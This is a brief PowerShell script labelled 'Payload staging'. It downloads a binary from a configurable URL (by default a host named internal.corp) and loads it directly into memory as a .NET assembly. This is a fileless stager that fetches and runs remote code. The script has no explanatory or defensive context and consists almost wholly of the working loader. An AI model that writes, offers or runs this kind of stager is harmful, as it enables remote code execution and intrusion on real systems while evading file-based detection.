
<# Payload staging #>
[CmdletBinding()]
param(
    [string]$TargetUrl = 'http://internal.corp/payload.bin'
)
$StageBytes = (New-Object System.Net.WebClient).DownloadData($TargetUrl)
[Reflection.Assembly]::Load($StageBytes)
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
